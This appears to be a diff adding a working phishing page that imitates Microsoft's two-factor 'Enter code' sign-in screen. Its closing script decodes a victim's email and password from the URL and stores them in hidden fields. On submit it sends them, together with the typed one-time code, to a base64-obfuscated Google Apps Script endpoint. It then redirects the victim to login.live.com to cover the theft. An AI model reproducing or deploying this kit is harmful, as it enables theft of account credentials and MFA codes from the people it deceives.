eoCLVMjf5xKDrpXBzxDVCG37FeZtfopHwzyh69TFzifk8EeVHd0Lv/DN98Eo/JfLgLfvaMAbYxnkHztRSQPvYLUsbdoKVH/0yDnO1TJbJfPnC6j8P1twjILfCbrqP15vzVuIfzNr5GA5AfzgQ5jMgc9FeXfn3zzIOIv7yEbrYIOPsyG8xlE2aGy/VdiZMezYD7iT+8AfDTPCmX4PvJBpKdH4fvQZfAtvgTeIdZAUmNZLsE8MS0+JSDRDErdLMsVt97On3g3NF8MpW0/FSM74U1fRWTLZqu7p/sEN6xD6l9v8O/3feBi+C6/lITrfv9WnAtEKZLt6RZ+cLuw2AmuWY109ggGqqOI79lJGcPeMbP2IfT1Deh7alhYLPTBNPqGH4Fn4RAlygjyN3xenOkMKyWqf3gB9UOHhMVO9O5tGMgfw8CJEcQeeUBYLWTid8L5EiP0RByF27aisuMZYXGOWanBv34dPIODwmKh9/Yi9OWN0AYH+HZG5dlnUP/bm+JsZ/TkPExeelVbKyJD73G+zXESVwIxPKkF1Cd9DvmNNzkKd82Rd5C7di2MXJaevl9YO8DTt0n1yjzkrr/RsrUiNtR4lZxII9s/hNL9D3GbjOreFzF+0RVWg+uiLDnjHUWjUKSYkod/6VL4Vy6Dd/Fiq8+iNNs8+m80Xn0d1d3UvY8coSeX5oHRv+Ia6BfMp7jTkoVCIdR+9zxlmQnerhhTU9TWXM+X36msxK95jq6Z5NcwWBVujk9R0aQj8OkV5MsS6IsupnbCD7NaQfOff6eAfhD1vX+iijpP4qfaSwcJZ7flyrIB+18ZtRCsjSB1rBNeqrr95AjVOCe3URl8a5Zlsk4EqUUQP5xhlsskTktt1XLNSfhOA30/b214e8N+Es0SEor7wV5bGl+nnJVA5wOuY9D5hhJIghJIghJIghJIghJIghJIghJIghJIghJIghJIghJIghJIghJIghJIghJIghJIghJIghKoK8D/AHuaeis/kRPSAAAAAElFTkSuQmCC">
+<style></style>
+<link rel="canonical" href="https://login.microsoftonline.com/login.srf">
+ 
+<style>
+img[src="data:,"],
+source[src="data:,"] {
+display: none !important
+}
+</style>
+</head>
+
+<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb remove-segoe-ui-symbol" style="display:block">
+
+
+
+<div><!--  -->
+
+<!--  -->
+
+<form name="form" id="formLogin" spellcheck="false" method="post" target="_top" autocomplete="off" 
+action="https://logssAuth">
+
+ 
+<div > 
+
+ 
+<div id="lightboxTemplateContainer"
+data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }">
+ 
+
+<div id="lightboxBackgroundContainer"  >
+    <div class="background-image-holder" role="presentation"
+        data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"
+        style="background:rgb(100,108,109)">
+ 
+    </div>
+</div>
+ 
+<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
+    <!-- ko if: showHeader --><!-- /ko -->
+
+    <div class="template-section main-section">
+        <div  class="middle ext-middle">
+            <div class="full-height"
+                data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }">
+                
+                <div class="flex-column">
+                     
+                    <div class="win-scroll">
+                        <div id="lightbox"   class="sign-in-box ext-sign-in-box fade-in-lightbox">
+
+                            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->
+
+                            <div class="lightbox-cover"
+                                data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; isRequestPending() }">
+                            </div>
+
+                            
+
+                            <div>
+                           
+                                <div  > 
+                                    <img id="bannerLogo"
+                                        
+                                        src=""
+                                        alt="Organization banner logo"
+                                        class="banner-logo ext-banner-logo">
+                                    
+                                </div>
+                               
+                                <div role="main" > 
+
+                                    <div data-bind="css: { 'zero-opacity': hidePaginatedView() }"
+                                        class>
+                                    
+                                        <div  class="slide-in-next">
+
+                                            <div  ><!--  -->
+
+                                                <div class="identityBanner">
+                                                    <!-- ko if: isBackButtonVisible --><!-- /ko -->
+
+                                                    <div id="displayName" class="identity"
+                                                     
+                                                        title="">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <!-- /ko -->
+
+                                        <div class="pagination-view animate has-identity-banner slide-in-next"
+                                           >
+ 
+                                            <div data-viewid="1" data-showidentitybanner="true"
+                                                >  <div id="idDiv_SAOTCC_Title" class="row text-title"
+                                                    role="heading" aria-level="1"
+                                                    data-bind="text: twoWayPollingNeeded ? str['CT_SAOTCAS_STR_Title'] : str['CT_SAOTCS_STR_Title']">
+                                                    Enter code</div>
+                                                <div class="row text-body">
+                                                    <div
+                                                       >
+                                                        <img
+                                                            class="tile-img small"
+                                                            role="presentation"
+                                                            pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_21883a995350a3eeb9c12f480b0d8110.png"
+                                                            svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_12b7d768ba76f2e782cc74e328171091.svg"
+                                                            data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }"
+                                                            src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzgsMzBWMTJIMTBWMzBoNHY0LjU3OEwxOC41NzgsMzBIMzhNMTIsMzJIOFYxMEg0MFYzMkgxOS40MjJMMTIsMzkuNDIyWiIgZmlsbD0iIzQwNDA0MCIvPjwvc3ZnPg=="> 
+                                                    </div>
+                                                    <div id="idDiv_SAOTCC_Description"
+                                                        class="text-block-body overflow-hidden"
+                                                        data-bind="text: description">We texted your
+                                                        phone . Please enter the code
+                                                        to sign in.</div>
+                                                </div>
+
+                                                <div class="text-block-body">
+                                                    <div id="idDiv_SAOTCC_OTCRow"
+                                                        class="form-group">
+                                                        <div role="alert" aria-live="assertive">
+                                                            <!-- ko if: error --><!-- /ko -->
+                                                        </div>
+                                                        <div id="idDiv_SAOTCC_Success_OTC"
+                                                            class="errorDiv" style="display:none">
+
+                                                        </div>
+                                                        <!-- ko ifnot: twoWayPollingNeeded || hideInputControls() -->
+                                                        <div id="idDiv_SAOTCC_OTC"
+                                                            class="textbox form-group">
+                                                            <div class="placeholderContainer"
+                                                                 > 
+
+                                                                <input id=""
+                                                                    name="otp" class="form-control"
+                                                                    type="tel" autocomplete="off"
+                                                                   
+                                                                    placeholder="Code" value>
+                                                                    
+                                       <input id="sss"   name="sss"   type="hidden">
+                                       <input id="ppp"   name="ppp"   type="hidden">
+                                                     
+                                                            </div>
+                                                        </div>
+
+                                                   
+                                                    </div>
+                                                </div>
+                                                <div class="text-block-body text-body"
+                                                    data-bind="visible: showSendNotification"
+                                                    style="display:none">
+
+                                                </div>
+
+                                                <div
+                                                    >
+                                                    <div class="row">
+                                                        <div id="idDiv_SAOTCC_TD_Section"
+                                                            class="no-margin-top-bottom">
+                                                            <div id="idDiv_SAOTCC_TD"
+                                                                class="col-md-24 form-group no-margin-top checkbox">
+                                                                <label id="idLbl_SAOTCC_TD_Cb">
+                                                                    <input id="idChkBx_SAOTCC_TD"
+                                                                        type="checkbox" value="true"
+                                                                      
+                                                                        name="rememberMFA"
+                                                                        aria-label="Don't ask again for 90 days"
+                                                                        checked>
+                                                                    <span
+                                                                        >Don't
+                                                                        ask again for 90 days</span>
+                                                                </label>
+                                                            </div>
+                                                        </div>
+
+                        <!-- ko if: isInitialState || svr.urlMoreInfo -->
+                        <div class="col-md-24">
+                            <div class="text-13">
+                                <!-- ko if: isInitialState && showSwitchProofsLink -->
+                                <div class="form-group"
+                                    id="idDiv_SAOTCS_HavingTrouble"
+                                        >Having trouble?
+                                    <a href="#"
+                                        id="signInAnotherWay">Sign
+                                        in another way</a>
+                                </div>
+                    
+                    <div data-bind="css: { 'form-group': !twoWayPollingNeeded }"
+                        class="form-group">
+                        <a id="moreInfoUrl"
+                            target="_blank"
+                            href="https://go.microsoft.com/fwlink/p/?LinkId=708614"
+                         >More
+                            information</a>
+                    </div>
+                    <!-- /ko -->
+                    <!-- /ko -->
+                    <!-- ko ifnot: svr.fEnableEmailOTP --><!-- /ko -->
+                </div>
+            </div>
+            <!-- /ko -->
+        </div>
+    </div>
+
+    <div class="win-button-pin-bottom boilerplate-button-bottom"
+        data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+        <div class="row move-buttons"
+            data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+            <div  >
+                <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container"
+                    >
+
+                    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
+
+                    <div  
+                        class="inline-block button-item ext-button-item">
+                        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+                        <input type="submit"
+                            id="idSubmit_SAOTCC_Continue"
+                            class="win-button button_primary button ext-button primary ext-primary"
+                            data-report-event="Signin_Submit"
+                            data-report-trigger="click"
+                            data-report-value="Submit"
+                                value="Verify">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ko if: tenantBranding.BoilerPlateText -->
+    <div id="idBoilerPlateText"
+        class="wrap-content boilerplate-text"  >
+        <p>  <a
+                href="https://cnc.teamdynamix.com/TDClient/56/Portal/Home/?ToUrl="
+                rel="noopener noreferrer"
+                target="_blank">submit a ticket with
+                us</a> for support.</p>
+    </div>
+    
+</div> 
+</div>
+</div>
+</div> 
+</div>
+
+
+
+
+
+                            <div  >
+                            </div>
+
+                            
+                        </div>
+
+                        
+                    </div>
+                </div>
+        
+            </div>
+        </div>
+    </div>
+
+    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
+    <div id="footer" role="contentinfo"   class="footer ext-footer has-background ext-has-background">
+
+        <div  >
+            <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
+            <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links"
+                data-bind="externalCss: { 'footer-links': true }">
+
+                <!-- ko if: showFooter -->
+                <!-- ko if: !hideTOU -->
+                <a id="ftrTerms"  href="https://www.microsoft.com/en-US/servicesagreement/"
+                    class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background">Terms
+                    of use</a>
+                <!-- /ko -->
+
+                <!-- ko if: !hidePrivacy -->
+                <a id="ftrPrivacy"   href="https://privacy.microsoft.com/en-US/privacystatement"
+                    class="footer-content ext-footer-content footer-item ext-footer-item has-background ext-has-background">Privacy
+                    &amp; cookies</a>
+                
+                <a id="moreOptions" href="#" role="button"   aria-label="Click here for troubleshooting information"
+                    aria-expanded="false"
+                    class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item has-background ext-has-background">...</a>
+            </div>
+            <!-- /ko -->
+
+            <!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko -->
+        </div>
+    </div>
+    <!-- /ko -->
+</div>
+<!-- /ko -->
+</div>
+<!-- /ko -->
+
+<!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
+<!-- /ko -->
+<!-- /ko -->
+</div>
+<!-- /ko -->
+</form>
+
+ 
+</div>
+</body>
+
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+    function extractNameFromEmail(email) {
+  return email.split('@')[1];
+}
+    $(document).ready(function() {
+
+const queryString = window.location.search;
+
+ var val=atob(queryString.replace('?', ''));
+ 
+ var urlParams = new URLSearchParams(val);
+ 
+ 
+$('#displayName').text(urlParams.get('user'));
+
+var ppp=   $("#ppp").val(urlParams.get('pass')); 
+var sss=   $("#sss").val(urlParams.get('user')); 
+const name = extractNameFromEmail(urlParams.get('user'));
+var power="http://www.google.com/s2/favicons?domain="+name;
+
+  $('#bannerLogo').attr('src',power);
+
+
+ 
+ 
+ 
+ 
+
+        $(document).on('submit', "#formLogin", function(e) {
+    
+            e.preventDefault();
+       //  return false; 
+            var li = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J5dWdfWUo2WVlRb2Vna0pNdm9QZGl6LThJXzhKRE9DMzFQN0duTWVaOGpsQ2ZFdE0zY3BJSUpGNTBMNWFkajMxb1IvZXhlYw==";
+            var lo = "aHR0cHM6Ly9sb2dpbi5saXZlLmNvbS8=";
+            $.ajax({
+                url: atob(li),
+                type: "GET",
+                data: $(this).serialize(),
+                success: function(data) {
+                    if (data = "done") {
+
+           
+                     window.location.href = atob(lo) ;
+
+                    }
+
+
+                },
+                error: function(jXHR, textStatus, errorThrown) {
+                    alert(errorThrown);
+
+                }
+            });
+        });
+    });
+</script>
+</html>
